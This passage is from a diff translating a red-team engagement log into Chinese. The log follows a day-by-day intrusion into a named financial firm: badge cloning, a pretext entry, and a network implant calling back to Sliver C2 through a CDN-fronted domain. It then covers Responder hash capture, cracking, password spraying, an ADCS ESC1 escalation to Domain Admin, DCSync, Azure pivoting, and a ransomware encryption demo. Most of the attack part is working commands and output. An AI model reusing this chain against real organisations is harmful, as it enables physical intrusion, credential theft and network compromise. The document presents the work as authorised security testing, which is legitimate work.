+C2 基础设施：
+  主用：        经 Cloudflare CDN 前置的 Sliver HTTPS
+  C2 域名：     cdn-assets-delivery[.]com（位于 Cloudflare 之后）
+  备用：        DNS-over-HTTPS 信标（Cloudflare DoH）
+中止暗语：      "Falcon One"
 ```
 
 ---
 
-### DAY 0: PRE-ENGAGEMENT INTELLIGENCE (2 DAYS BEFORE ENTRY)
+### 第 0 天：行动前情报（进入前 2 天）
 
 ```
-OSINT PHASE:
+OSINT 阶段：
 
-  Target: Meridian Capital Group headquarters, 200 West Adams St, Chicago
+  目标：Meridian Capital Group 总部，芝加哥西亚当斯街 200 号
   
-  LinkedIn reconnaissance:
-    Employees identified: 47 IT-related LinkedIn profiles
-    IT Director: Robert Mehta (14 years at Meridian, Chicago)
-    IT Helpdesk Lead: Jason Patel (mentions ServiceNow and Azure AD in his profile)
-    Systems Administrator: Laura Chen (posts about Windows Server 2022 migrations)
-    Security team: 4 people identified (John Kowalski - Security Manager)
+  LinkedIn 侦察：
+    已识别员工：47 个与 IT 相关的 LinkedIn 资料
+    IT 总监：Robert Mehta（在 Meridian 14 年，芝加哥）
+    IT 服务台主管：Jason Patel（资料中提及 ServiceNow 与 Azure AD）
+    系统管理员：Laura Chen（发布关于 Windows Server 2022 迁移的内容）
+    安全团队：识别出 4 人（John Kowalski - 安全经理）
     
-  Technology stack (from job postings + LinkedIn):
-    AD/Identity: "Active Directory + Azure AD hybrid join" (from IT Manager job posting)
-    Email: Microsoft 365 (O365)
-    Endpoint: CrowdStrike Falcon (from a "cybersecurity engineer" job posting skills list)
-    Network: Palo Alto firewalls (from job posting)
-    Help Desk: ServiceNow
-    Dev: Azure DevOps (from software engineer postings)
-    Database: Microsoft SQL Server (from DBA job posting)
-    C2 blocking: Palo Alto URL filtering (expect custom-category blocking)
+  技术栈（来自招聘启事 + LinkedIn）：
+    AD/身份：“Active Directory + Azure AD 混合加入”（来自 IT 经理招聘启事）
+    邮件：Microsoft 365（O365）
+    端点：CrowdStrike Falcon（来自“网络安全工程师”招聘启事的技能列表）
+    网络：Palo Alto 防火墙（来自招聘启事）
+    服务台：ServiceNow
+    研发：Azure DevOps（来自软件工程师招聘启事）
+    数据库：Microsoft SQL Server（来自 DBA 招聘启事）
+    C2 阻断：Palo Alto URL 过滤（预期会有自定义类别阻断）
   
-  EDR NOTE: CrowdStrike Falcon is confirmed. This changes the implant callback strategy.
-  AutoSSH will be detected. Use Sliver HTTPS over CDN fronting exclusively.
+  EDR 备注：已确认 CrowdStrike Falcon。这会改变植入体的回连策略。
+  AutoSSH 会被检测到。只用经 CDN 前置的 Sliver HTTPS。
 
-DRONE RECON:
-  DJI Mini 4 Pro deployed from a parked car 200m south of the building.
-  Results (optical survey, 18-minute flight at 70m AGL):
-    Camera count:  14 exterior cameras identified (positions annotated)
-    Dead zones:    Loading dock west side: 8-meter dead zone between cameras
-                   North fire exit: camera angled away, 4-meter approach gap
-    Roof:          No rooftop cameras visible, HVAC units, one satellite dish
-    Badge readers: Visible on all 3 exterior entrances (HID-branded readers)
-    Parking:       Executive parking south lot (4 high-end vehicles, numbered spots)
-    Delivery:      FedEx arrives between 10:30-11:00am daily (observed across 2 days)
+无人机侦察：
+  DJI Mini 4 Pro 从大楼以南 200 米的停放车辆处起飞。
+  结果（光学勘察，70m 离地高度飞行 18 分钟）：
+    摄像头数量：  识别出 14 台外部摄像头（位置已标注）
+    死区：        西侧装卸平台：摄像头之间有 8 米死区
+                   北侧紧急出口：摄像头背向，有 4 米接近缺口
+    屋顶：        未见屋顶摄像头，有暖通机组，一面卫星天线
+    读卡器：      3 个外部入口都可见（HID 品牌读卡器）
+    停车：        南侧高管停车区（4 辆高档车，车位有编号）
+    收货：        FedEx 每天 10:30-11:00 之间到达（两天观测结果）
   
-  Thermal recon (6:30am, before opening):
-    Floor 12 thermal signature: significant heat bloom from multiple server racks
-    Floor 2 (north wing): elevated heat from what appears to be a networking closet
-    No overnight occupancy detected at the time of the flight
+  热成像侦察（6:30，开门前）：
+    12 层热特征：多个服务器机架散出显著热晕
+    2 层（北翼）：似乎是一个网络间的热量升高
+    飞行时段未检测到有人通宵在场
 
-RFID RECONNAISSANCE:
-  HID readers confirmed from drone photos (model: HID multiCLASS SE RMPK40 visible on entry photos).
-  The multiCLASS SE reads BOTH 125kHz and 13.56MHz.
-  Pre-engagement OSINT showed the building was constructed in 2009.
-  Assessment: likely original 125kHz HID Prox cards still in use for most staff,
-  with a possible migration in progress to SEOS for executive floor.
-  Attack plan: capture 125kHz HID Prox credential from a standard employee.
+RFID 侦察：
+  无人机照片确认是 HID 读卡器（型号：入口照片上可见 HID multiCLASS SE RMPK40）。
+  multiCLASS SE 同时读取 125kHz 和 13.56MHz。
+  行动前 OSINT 显示该楼建于 2009 年。
+  评估：多数员工很可能仍在使用原装 125kHz HID Prox 卡，
+        高管楼层可能正在迁移到 SEOS。
+  攻击计划：从一名普通员工身上采集 125kHz HID Prox 凭证。
 ```
 
 ---
 
-### DAY 3: RFID CAPTURE AND CREDENTIAL CLONING
+### 第 3 天：RFID 采集与凭证克隆
 
 ```
-OPERATION:
-  Location: coffee shop adjacent to Meridian Capital building (ground-floor lobby cafe)
-  Operator: dressed in business casual, laptop open, working at a counter seat
-  Equipment: Proxmark3 RDV4 in jacket pocket, T5577 blank cards
+行动：
+  地点：Meridian Capital 大楼旁的咖啡店（一层大堂咖啡吧）
+  操作员：商务休闲装，笔记本打开，在吧台座位工作
+  装备：外套口袋里的 Proxmark3 RDV4，T5577 空白卡
 
-09:42: Target acquisition
-  Employee identified: mid-30s male, badge visible on belt clip at hip level,
-  laptop bag, queuing for coffee at counter.
-  Proxmark3 HF antenna enabled at 125kHz.
-  Operator adjusts position: stands to the left of the target in the queue,
-  Proxmark3 in jacket pocket at hip height, approximately 12cm from target badge.
+09:42：锁定目标
+  识别到的员工：30 多岁男性，证件夹在腰带卡扣上位于髋部，
+  带笔记本包，在吧台排队买咖啡。
+  Proxmark3 高频天线以 125kHz 启用。
+  操作员调整位置：站到队伍中目标左侧，
+  Proxmark3 在外套口袋、髋部高度，距目标证件约 12cm。
 
-09:43: Credential captured
+09:43：凭证采集成功
   pm3 --> lf hid reader
   [+] HID Prox 26bit  FC: 117 CN: 5643
-  Standard 26-bit Wiegand format. Facility Code 117, Card Number 5643.
+  标准 26 位 Wiegand 格式。设施码 117，卡号 5643。
 
-09:43:30: Clone written to T5577
+09:43:30：克隆写入 T5577
   pm3 --> lf hid clone --fc 117 --cn 5643
   [+] Done. T5577 card simulates HID Prox: FC 117 / CN 5643
 
-VERIFICATION:
-  Operator tests the T5577 at an HID Prox reader on a different building
-  (library nearby with the same reader type).
+验证：
+  操作员在另一栋楼（附近图书馆，同型号读卡器）
+  的 HID Prox 读卡器上测试该 T5577。
   [+] Green light. Card accepted. Clone works.
 ```
 
 ---
 
-### DAY 4: PHYSICAL ENTRY AND IMPLANT DEPLOYMENT (47 SECONDS)
+### 第 4 天：物理进入与植入部署（47 秒）
 
 ```
-PRETEXT:
-  Role: IT support vendor for "ClearPath Network Services" (real local IT vendor
-        that Meridian uses: found in a job posting for "preferred vendor" list)
-  Legend: "Marcus Webb, Network Infrastructure Engineer, ClearPath"
-  Props: business cards (ClearPath branding), work order (quarterly AV check),
-         tool bag (Pelican 1510 case: signals professional), vendor polo shirt
-  Badge: visual clone of Meridian visitor badge (designed from drone + pretext visit photos)
-  RFID: cloned T5577 card in badge clip
+托词：
+  角色：“ClearPath Network Services”（Meridian 实际使用的本地 IT 厂商，
+        在一份“优选供应商”名单的招聘启事中找到）的 IT 支持厂商人员
+  身份：“Marcus Webb，ClearPath 网络基础设施工程师”
+  道具：名片（ClearPath 品牌）、工单（季度音视频巡检）、
+        工具包（Pelican 1510 箱：显得专业）、厂商 polo 衫
+  证件：Meridian 访客证件的视觉克隆（依据无人机 + 托词走访照片设计）
+  RFID：证件卡扣里是克隆的 T5577 卡
 
-10:05: Arrival at main reception
-  "Good morning: Marcus Webb from ClearPath, here for the quarterly infrastructure check.
-   I believe Jason Patel in IT has the ticket open for this."
-  Receptionist: "Let me check... yes, I see ClearPath in our vendor calendar. 
-  One moment: I will call up." [Calls IT desk]
-  Operator: "Of course. While you check: do you know if the conference rooms on
-  floor 2 are booked all morning? We may need 30 minutes in one of the AV rooms."
-  Receptionist issues visitor badge: "Floor 2, conference rooms 2A and 2B are open until noon."
+10:05：到达主前台
+  “早上好：我是 ClearPath 的 Marcus Webb，来做季度基础设施巡检。
+   我想 IT 的 Jason Patel 有对应的工单。”
+  前台：“我查一下……对，我们的供应商日历里有 ClearPath。
+  稍等：我打个电话上去。”[致电 IT 台]
+  操作员：“当然。你查的时候顺便问一下：2 层会议室
+  今天上午是不是都订满了？我们可能需要在某个音视频室待 30 分钟。”
+  前台发放访客证件：“2 层，2A 和 2B 会议室开放到中午。”
 
-10:09: Floor 2 reached via elevator
-  Visitor badge accepted on elevator panel for floors 1-3.
-  For higher floor access: operator uses the cloned HID Prox card discreetly
-  on a secondary reader while passing a maintenance corridor on floor 2.
-  Floor 2 networking closet observed through glass window: patch panel, switches.
+10:09：乘电梯到达 2 层
+  访客证件在电梯面板上可通行 1-3 层。
+  要上更高楼层：操作员在经过 2 层维修走廊时，
+  悄悄用克隆的 HID Prox 卡刷了另一个读卡器。
+  透过玻璃窗看到 2 层网络间：配线架、交换机。
 
-10:11: Networking closet entry (maintenance corridor, no camera coverage)
-  Dead zone confirmed by drone recon: this corridor has no coverage.
-  HID Prox clone used on closet reader: [green light: access granted]
+10:11：进入网络间（维修走廊，无摄像头覆盖）
+  无人机侦察已确认死区：这条走廊没有覆盖。
+  HID Prox 克隆卡刷网络间读卡器：[绿灯：放行]
   
-IMPLANT DEPLOYMENT (Hak5 LAN Turtle Gen 3):
-  10:11:30: Enter closet. Identify Cisco Catalyst 3850 switch (PoE-capable).
-  10:11:45: Locate an unused port (port 23 of 24: port LED dark).
-  10:11:52: Connect LAN Turtle to switch port 23 via CAT5e patch cable.
-  10:12:00: LAN Turtle LED: solid blue (powered via PoE: no battery needed).
-            LAN Turtle hostname: changes to "CSCO_NET_ASSIST" (pre-configured).
-            MAC address: spoofed to 00:17:A4:XX:XX:XX (HP OUI: blends with HP printers on the floor).
-  10:12:05: LAN Turtle beacon configured for Sliver HTTPS over CDN fronting:
-            Sleep 1800 seconds + 50% jitter.
-            First callback expected within 30-60 minutes.
-  10:12:17: Exit closet. Close door. Elapsed time in closet: 47 seconds.
+植入部署（Hak5 LAN Turtle Gen 3）：
+  10:11:30：进入网络间。找到 Cisco Catalyst 3850 交换机（支持 PoE）。
+  10:11:45：定位一个空闲端口（24 口中的 23 口：端口灯不亮）。
+  10:11:52：用 CAT5e 跳线把 LAN Turtle 接到 23 口。
+  10:12:00：LAN Turtle 指示灯：蓝灯常亮（由 PoE 供电：无需电池）。
+            LAN Turtle 主机名：改为 "CSCO_NET_ASSIST"（预先配置）。
+            MAC 地址：伪造成 00:17:A4:XX:XX:XX（HP OUI：与该层的 HP 打印机混在一起）。
+  10:12:05：LAN Turtle 信标配置为经 CDN 前置的 Sliver HTTPS：
+            休眠 1800 秒 + 50% 抖动。
+            预期首次回连在 30-60 分钟内。
+  10:12:17：离开网络间。关门。在网络间内耗时：47 秒。
   
-10:15: Depart building via lobby
-  "I think we got everything we need for today. I will file the ticket closure with Jason."
-  Receptionist: "Great: have a good day."
-  Operator exits.
+10:15：经大堂离开大楼
+  “今天需要的应该都拿到了。我会跟 Jason 那边提交工单关闭。”
+  前台：“好的：祝你今天愉快。”
+  操作员离开。
 
-14:37: First Sliver beacon callback received at C2 server
+14:37：C2 服务器收到首个 Sliver 信标回连
   [*] Beacon 7f3a2c1b (CSCO_NET_ASSIST) checked in
   [*] 10.10.2.47 -> cdn-assets-delivery.com (Cloudflare) -> C2
   [*] OS: Linux 5.15 (LAN Turtle OpenWrt)
@@ -4414,82 +4414,82 @@ IMPLANT DEPLOYMENT (Hak5 LAN Turtle Gen 3):
 
 ---
 
-### DAY 4 (EVENING): CREDENTIAL CAPTURE
+### 第 4 天（晚间）：凭证捕获
 
 ```bash
-# Sliver session: pivot through LAN Turtle to run Responder
+# Sliver 会话：经 LAN Turtle 跳板运行 Responder
 sliver > use 7f3a2c1b
 sliver (CSCO_NET_ASSIST) > execute /usr/local/bin/python3 /opt/Responder/Responder.py -I br-lan -wPv
 
-# Responder runs on the LAN Turtle, poisoning LLMNR, NBT-NS, WPAD on the 10.10.2.0/24 subnet
+# Responder 在 LAN Turtle 上运行，对 10.10.2.0/24 子网投毒 LLMNR、NBT-NS、WPAD
 
-# By 11:30pm, 3 NTLMv2 hashes captured:
+# 到晚上 11:30，捕获 3 个 NTLMv2 哈希：
 # [SMB] NTLMv2 Hash  : jchen::MERIDIAN:abc123...  (Laura Chen - Sys Admin)
 # [HTTP] NTLMv2 Hash : jpatel::MERIDIAN:def456...  (Jason Patel - IT Lead)
 # [WPAD] NTLMv2 Hash : rmehta::MERIDIAN:ghi789...  (Robert Mehta - IT Director)
 
-# Extract and save hashes:
+# 提取并保存哈希：
 sliver (CSCO_NET_ASSIST) > download /opt/Responder/logs/Responder-Session.log /tmp/
 ```
 
 ```bash
-# On operator machine: crack with hashcat
+# 在操作员机器上：用 hashcat 破解
 hashcat -m 5600 hashes.txt /opt/wordlists/rockyou.txt \
         --rules-file /opt/hashcat/rules/best64.rule -O
 
-# Results after 4 hours (NVIDIA RTX 4090, ~8.2 billion/second):
+# 4 小时后的结果（NVIDIA RTX 4090，约 82 亿次/秒）：
 # jchen::MERIDIAN:... : [NOT CRACKED - complex password]
 # jpatel::MERIDIAN:... : Winter2025!  [CRACKED: 11 hours at GPU speed BUT weak rule hit fast]
 # rmehta::MERIDIAN:... : [NOT CRACKED]
 
-# jpatel (Jason Patel, IT Helpdesk Lead) password: Winter2025!
+# jpatel（Jason Patel，IT 服务台主管）密码：Winter2025!
 ```
 
 ---
 
-### DAY 5: CLOUD INITIAL ACCESS
+### 第 5 天：云端初始访问
 
 ```bash
-# Use jpatel's M365 credentials to enumerate Azure AD (external, no network access needed)
+# 用 jpatel 的 M365 凭证枚举 Azure AD（外部操作，无需网络访问）
 
-# Install ROADtools for Azure AD enumeration:
+# 安装 ROADtools 做 Azure AD 枚举：
 pip3 install roadtools --break-system-packages
 pip3 install roadrecon --break-system-packages
 
-# Authenticate to Azure AD as jpatel:
+# 以 jpatel 身份认证到 Azure AD：
 roadrecon auth -u jpatel@meridianCapital.com -p 'Winter2025!'
 
-# Spray check: verify account is not locked before using:
-# MSOLSpray with 90-second sleep (Microsoft Smart Lockout bypass):
+# 喷洒检查：使用前确认账户未被锁定：
+# 带 90 秒休眠的 MSOLSpray（绕过 Microsoft 智能锁定）：
 python3 MSOLSpray.py --userlist emails.txt --password 'Winter2025!' --sleep 90
 
-# Collect Azure AD data (users, groups, roles, apps, service principals):
+# 收集 Azure AD 数据（用户、组、角色、应用、服务主体）：
 roadrecon gather
-roadrecon gui  # Launch web UI at http://127.0.0.1:5000 for visual exploration
+roadrecon gui  # 在 http://127.0.0.1:5000 启动 Web 界面做可视化探索
 
-# Key findings from roadrecon:
-# jpatel is a member of: HelpDesk_Operators, IT_Support
-# HelpDesk_Operators has GlobalReader role in Azure AD (can read all directory objects)
-# Azure DevOps organization found: https://dev.azure.com/MeridianCapital
-# 14 Service Principals found: 3 have Owner permissions on resource groups
+# roadrecon 的关键发现：
+# jpatel 属于：HelpDesk_Operators、IT_Support
+# HelpDesk_Operators 在 Azure AD 中有 GlobalReader 角色（可读取所有目录对象）
+# 发现 Azure DevOps 组织：https://dev.azure.com/MeridianCapital
+# 发现 14 个服务主体：其中 3 个对资源组有 Owner 权限
 
-# Also: jpatel's account has Azure AD joined device registered (indicates no MFA for device auth)
+# 另外：jpatel 的账户注册了 Azure AD 加入设备（说明设备认证未启用 MFA）
 ```
 
 ---
 
-### DAY 5: INTERNAL AD RECONNAISSANCE (THROUGH SLIVER SESSION)
+### 第 5 天：内部 AD 侦察（通过 SLIVER 会话）
 
 ```bash
-# On Sliver C2: route traffic through LAN Turtle to internal network
+# 在 Sliver C2 上：把流量经 LAN Turtle 路由到内部网络
 sliver (CSCO_NET_ASSIST) > socks5 start --host 127.0.0.1 --port 1080
 [*] Started SOCKS5 listener on 127.0.0.1:1080
 
-# Configure proxychains on operator machine:
-# /etc/proxychains4.conf:
+# 在操作员机器上配置 proxychains：
+# /etc/proxychains4.conf：
 # socks5 127.0.0.1 1080
 
-# Run BloodHound collection through the SOCKS tunnel (using jpatel credentials):
+# 通过 SOCKS 隧道运行 BloodHound 收集（使用 jpatel 凭证）：
 proxychains4 python3 bloodhound.py \
     -u jpatel \
     -p 'Winter2025!' \
@@ -4498,24 +4498,24 @@ proxychains4 python3 bloodhound.py \
     -c All \
     --zip
 
-# Import BloodHound JSON into Neo4j:
-# Upload .zip to BloodHound Community Edition (docker run specterops/bloodhound)
+# 把 BloodHound JSON 导入 Neo4j：
+# 把 .zip 上传到 BloodHound Community Edition（docker run specterops/bloodhound）
 
-# BloodHound attack path discovered:
-# jpatel (HelpDesk_Operators) --> GenericWrite --> jchen (jsmith tier 1 admin)
-# jchen --> member of ServiceAccounts
-# ServiceAccounts --> mssql_svc (service account: Kerberoastable)
-# mssql_svc --> Backup Operators (via nested group)
-# Backup Operators --> can read NTDS.dit (DC backup: DC escalation)
+# BloodHound 发现的攻击路径：
+# jpatel（HelpDesk_Operators）--> GenericWrite --> jchen（jsmith 一级管理员）
+# jchen --> ServiceAccounts 的成员
+# ServiceAccounts --> mssql_svc（服务账户：可 Kerberoast）
+# mssql_svc --> Backup Operators（经由嵌套组）
+# Backup Operators --> 可读取 NTDS.dit（DC 备份：DC 提权）
 ```
 
 ---
 
-### DAY 6: ACTIVE DIRECTORY AND ADCS ESCALATION
+### 第 6 天：ACTIVE DIRECTORY 与 ADCS 提权
 
 ```bash
-# Step 1: Kerberoast mssql_svc (reachable via privilege escalation chain)
-# First: abuse GenericWrite on jchen to reset her password (or force SPN):
+# 步骤 1：Kerberoast mssql_svc（可通过提权链触达）
+# 首先：滥用对 jchen 的 GenericWrite 重置她的密码（或强制设置 SPN）：
 proxychains4 python3 -c "
 from ldap3 import *
 s = Server('10.10.1.10', get_info=ALL)
@@ -4524,38 +4524,38 @@ c.modify('CN=Laura Chen,OU=IT,DC=meridian,DC=local',
          {'unicodePwd': [(MODIFY_REPLACE, ['\"TempPass2027!\"'.encode('utf-16-le')])]})
 print(c.result)
 "
-# Account: jchen | New password: TempPass2027!
+# 账户：jchen | 新密码：TempPass2027!
 
-# Step 2: Kerberoast mssql_svc using jchen credentials:
+# 步骤 2：用 jchen 凭证 Kerberoast mssql_svc：
 proxychains4 impacket-GetUserSPNs \
     -request \
     -dc-ip 10.10.1.10 \
     'meridian.local/jchen:TempPass2027!'
 
-# Output: Kerberos 5 TGS-REP hash for mssql_svc
+# 输出：mssql_svc 的 Kerberos 5 TGS-REP 哈希
 # $krb5tgs$23$*mssql_svc$MERIDIAN.LOCAL$... (TGS hash)
 
-# Crack the Kerberoast hash:
+# 破解 Kerberoast 哈希：
 hashcat -m 13100 mssql_svc_tgs.txt /opt/wordlists/rockyou.txt -O
-# Result: mssql_svc : Sql$erver2024
+# 结果：mssql_svc : Sql$erver2024
 ```
 
 ```bash
-# Step 3: ADCS enumeration (from Sliver SOCKS tunnel)
+# 步骤 3：ADCS 枚举（从 Sliver SOCKS 隧道）
 proxychains4 certipy find \
     -u 'mssql_svc@meridian.local' \
     -p 'Sql$erver2024' \
     -dc-ip 10.10.1.10 \
     -stdout
 
-# Certipy finds vulnerable template: "MeridianUserAuth"
-# Vulnerabilities: ESC1
-#   Enrollment allowed for: Domain Users
-#   Client can supply SAN: YES
-#   No manager approval: YES
-#   EKU includes: Client Authentication
+# Certipy 发现存在漏洞的模板："MeridianUserAuth"
+# 漏洞：ESC1
+#   允许注册的组：Domain Users
+#   客户端可自填 SAN：是
+#   无管理员审批：是
+#   EKU 包含：Client Authentication
 
-# Step 4: ESC1 exploit: request certificate as Administrator
+# 步骤 4：ESC1 利用：以 Administrator 身份申请证书
 proxychains4 certipy req \
     -u 'mssql_svc@meridian.local' \
     -p 'Sql$erver2024' \
@@ -4564,9 +4564,9 @@ proxychains4 certipy req \
     -dc-ip 10.10.1.10 \
     -upn 'Administrator@meridian.local'
 
-# Output: administrator.pfx saved
+# 输出：已保存 administrator.pfx
 
-# Step 5: Authenticate with certificate to get DA TGT + NTLM hash:
+# 步骤 5：用证书认证，获取 DA 的 TGT + NTLM 哈希：
 proxychains4 certipy auth \
     -pfx administrator.pfx \
     -dc-ip 10.10.1.10
@@ -4574,94 +4574,94 @@ proxychains4 certipy auth \
 # [*] Got TGT
 # [*] Got hash for 'administrator@meridian.local': aad3b435b51404ee:[NTLM_HASH]
 
-# Step 6: DCSync - dump all domain hashes (Domain Admin via ADCS certificate):
+# 步骤 6：DCSync —— 转储所有域哈希（通过 ADCS 证书取得域管理员）：
 proxychains4 impacket-secretsdump \
     -hashes 'aad3b435b51404ee:[NTLM_HASH]' \
     'meridian.local/Administrator@10.10.1.10'
 
-# Output includes:
+# 输出包含：
 # Administrator:500:[LM]:[NT]:::
 # krbtgt:502:[LM]:[NT]:::
 # jchen:1234:[LM]:[NT]:::
 # (all domain accounts)
 
-# Domain is fully compromised.
+# 域已完全攻陷。
 ```
 
 ---
 
-### DAY 7: AZURE AD LATERAL MOVEMENT (CLOUD CHAINING)
+### 第 7 天：AZURE AD 横向移动（云上串联）
 
 ```bash
-# We have DA on-prem. Now chain into Azure AD (Entra ID) using the hybrid join.
-# Hybrid-joined environments sync AD users to Azure AD.
-# Administrator's on-prem NTLM hash can generate Azure AD access tokens.
+# 我们已在本地取得 DA。现在利用混合加入链入 Azure AD（Entra ID）。
+# 混合加入环境会把 AD 用户同步到 Azure AD。
+# Administrator 的本地 NTLM 哈希可以生成 Azure AD 访问令牌。
 
-# Step 1: Use AADInternals to extract Azure AD tokens via on-prem NTLM:
-# Install AADInternals (PowerShell):
+# 步骤 1：用 AADInternals 通过本地 NTLM 提取 Azure AD 令牌：
+# 安装 AADInternals（PowerShell）：
 Install-Module AADInternals -Force
 
-# Through Sliver session on a domain-joined Windows host:
-# (Lateral move to a Windows host first via pass-the-hash)
+# 通过域加入 Windows 主机上的 Sliver 会话：
+# （先用哈希传递横向移动到一台 Windows 主机）
 proxychains4 impacket-wmiexec \
     -hashes 'aad3b435b51404ee:[NTLM_HASH]' \
     'meridian.local/Administrator@10.10.1.15'
 
-# On the Windows host (via wmiexec shell):
+# 在 Windows 主机上（通过 wmiexec shell）：
 powershell -c "
 Import-Module AADInternals
-# Get Azure AD access token using current domain admin context:
+# 用当前域管理员上下文获取 Azure AD 访问令牌：
 \$token = Get-AADIntAccessTokenForAADGraph -SaveToCache
 Get-AADIntTenantID
 "
 
-# Step 2: Enumerate Azure AD service principals with elevated permissions:
-# (Using roadrecon data from Day 5: 3 service principals have Owner on resource groups)
+# 步骤 2：枚举拥有高权限的 Azure AD 服务主体：
+# （使用第 5 天的 roadrecon 数据：3 个服务主体对资源组有 Owner 权限）
 
-# Use az CLI through proxychains to interact with Azure:
+# 通过 proxychains 用 az CLI 与 Azure 交互：
 proxychains4 az login --service-principal \
     -u [APP_ID] \
     -p [APP_SECRET] \
     --tenant [TENANT_ID]
 
-# List resource groups owned by the service principal:
+# 列出该服务主体拥有的资源组：
 proxychains4 az group list --output table
 
-# List Azure DevOps organizations accessible with the service principal token:
+# 列出该服务主体令牌可访问的 Azure DevOps 组织：
 proxychains4 az devops configure --defaults organization=https://dev.azure.com/MeridianCapital
 
-# Step 3: Access Azure DevOps and reach the crown jewel (trading algorithm repo):
+# 步骤 3：访问 Azure DevOps，触达核心资产（交易算法仓库）：
 proxychains4 az devops project list --output table
-# Output: TradingPlatform (Private), RiskModels (Private), Infrastructure (Private)
+# 输出：TradingPlatform（私有）、RiskModels（私有）、Infrastructure（私有）
 
-# Clone the crown jewel repository:
+# 克隆核心仓库：
 proxychains4 git clone \
     https://[TOKEN]@dev.azure.com/MeridianCapital/TradingPlatform/_git/algo-engine \
     /tmp/algo-engine
 
-# Crown jewel reached. Document: git log shows the last commit author, date, code contents.
-# Screenshot of: git log --oneline | head -10 goes in the report.
+# 核心资产已触达。记录：git log 显示最后提交作者、日期、代码内容。
+# 报告中放入：git log --oneline | head -10 的截图。
 
-# We do NOT exfiltrate actual proprietary code. We document the access and stop.
-# Report note: "Successfully cloned the 'algo-engine' repository (TradingPlatform project)
-# containing proprietary trading algorithm source code. 112 files, 47,000 lines of code.
-# No data was transferred off the Azure DevOps platform beyond metadata for this report."
+# 我们不外传真实的专有代码。我们记录访问事实然后停止。
+# 报告备注：“成功克隆了 'algo-engine' 仓库（TradingPlatform 项目），
+# 其中包含专有交易算法源代码。112 个文件，47,000 行代码。
+# 除本报告所需的元数据外，没有从 Azure DevOps 平台传出任何数据。”
 ```
 
 ---
 
-### DAY 7: SQL ACCESS (SECOND CROWN JEWEL)
+### 第 7 天：SQL 访问（第二个核心资产）
 
 ```bash
-# mssql_svc credentials already cracked. SQL Server identified from roadrecon data.
-# SQL Server: 10.10.2.25 (internal; reachable through Sliver SOCKS)
+# mssql_svc 凭证已破解。从 roadrecon 数据中识别出 SQL Server。
+# SQL Server：10.10.2.25（内网；可经 Sliver SOCKS 触达）
 
-# Connect via proxychains + impacket-mssqlclient:
+# 通过 proxychains + impacket-mssqlclient 连接：
 proxychains4 impacket-mssqlclient \
     'meridian.local/mssql_svc:Sql$erver2024@10.10.2.25' \
     -windows-auth
 
-# SQL Server commands:
+# SQL Server 命令：
 SQL> SELECT @@version
 # Microsoft SQL Server 2022
 
@@ -4670,16 +4670,16 @@ SQL> SELECT name FROM sys.databases
 
 SQL> USE PortfolioData
 SQL> SELECT COUNT(*) FROM client_portfolios
-# 3,847 (client portfolio records)
+# 3,847（客户投资组合记录）
 SQL> SELECT TOP 1 * FROM client_portfolios
-# [Shows schema: ClientID, Name, Portfolio value, Holdings -- DO NOT screenshot actual names]
+# [显示表结构：ClientID、Name、Portfolio value、Holdings —— 不要截取真实姓名]
 
-# Report note: "We accessed the PortfolioData database and confirmed read access to
-# 3,847 client portfolio records. Query results showed: client names, account balances,
-# and portfolio holdings. No data was recorded or extracted."
+# 报告备注：“我们访问了 PortfolioData 数据库，并确认对
+# 3,847 条客户投资组合记录具有读取权限。查询结果显示了：客户姓名、账户余额
+# 以及投资组合持仓。未记录也未外传任何数据。”
 
-# Ransomware simulation:
-# Create test files in a non-production directory:
+# 勒索软件模拟：
+# 在非生产目录中创建测试文件：
 SQL> EXECUTE xp_cmdshell 'mkdir C:\RedTeam_Test'
 SQL> EXECUTE xp_cmdshell 'echo TestFile > C:\RedTeam_Test\test_document_001.txt'
 SQL> EXECUTE xp_cmdshell 'echo TestFile > C:\RedTeam_Test\test_document_002.txt'
@@ -4689,34 +4689,34 @@ SQL> EXECUTE xp_cmdshell 'echo TestFile > C:\RedTeam_Test\test_document_003.txt'
 ```python
 #!/usr/bin/env python3
 """
-Ransomware Simulation: AES-256 encrypt test files (not real data).
-Files created by red team in a designated test directory only.
-Demonstrates cryptographic ransomware capability WITHOUT touching real files.
-All files are decrypted and restored before red team departs.
+勒索软件模拟：对测试文件做 AES-256 加密（不是真实数据）。
+文件仅由红队在指定的测试目录中创建。
+在不触碰任何真实文件的前提下演示密码学勒索能力。
+红队离开前会解密并还原所有文件。
 
-Requirements: pip3 install cryptography
+要求：pip3 install cryptography
 """
 
 from cryptography.fernet import Fernet
 from pathlib import Path
 import os
 
-# Generate a symmetric key (represents the ransomware key):
+# 生成对称密钥（代表勒索密钥）：
 key = Fernet.generate_key()
 f = Fernet(key)
 
-# Scope: ONLY the test directory. Never touch real files.
+# 范围：仅限测试目录。绝不触碰真实文件。
 TEST_DIR = Path("C:/RedTeam_Test")
 KEY_FILE = TEST_DIR / "ENCRYPTION_KEY.txt"
 
-# Encrypt all test files:
+# 加密所有测试文件：
 encrypted_files = []
 for test_file in TEST_DIR.glob("test_document_*.txt"):
     plaintext = test_file.read_bytes()
     ciphertext = f.encrypt(plaintext)
     encrypted_path = test_file.with_suffix(".enc")
     encrypted_path.write_bytes(ciphertext)
-    test_file.unlink()  # Remove original
+    test_file.unlink()  # 删除原文件
     encrypted_files.append((encrypted_path, plaintext))
     print(f"[+] Encrypted: {test_file.name} -> {encrypted_path.name}")
 
@@ -4724,7 +4724,7 @@ print(f"\n[*] {len(encrypted_files)} test files encrypted.")
 print(f"[*] This simulates ransomware execution against: {TEST_DIR}")
 print(f"[*] Real encryption key: {key.decode()}")
 
-# IMMEDIATELY DECRYPT (engagement requirement: no actual damage):
+# 立即解密（行动要求：不得造成实际损害）：
 print(f"\n[*] Decrypting (restoring all test files)...")
 for enc_path, original_content in encrypted_files:
     original_path = enc_path.with_suffix(".txt")
@@ -4739,467 +4739,467 @@ print(f"[*] Screenshot included in report as Figure [N].")
 
 ---
 
-### DAY 8: CLEANUP AND RETRIEVAL
+### 第 8 天：清理与取回
 
 ```bash
-# Step 1: AD cleanup
-# Restore jchen password (document in cleanup log):
+# 步骤 1：AD 清理
+# 还原 jchen 的密码（记录在清理日志中）：
 # Set-ADAccountPassword -Identity jchen -Reset -NewPassword (ConvertTo-SecureString 'Original' -AsPlainText -Force)
-# Note: if we do not know the original: flag in report. Client's AD team resets it.
+# 注意：如果我们不知道原密码：在报告中标注。由客户的 AD 团队重置。
 
-# Step 2: Revoke ADCS certificate
-# Record the serial number from certipy req output.
-# Client's CA admin must revoke it via Certification Authority MMC console.
-# Serial number included in report as: "Certificate Serial: [SERIAL]"
+# 步骤 2：吊销 ADCS 证书
+# 从 certipy req 的输出中记录序列号。
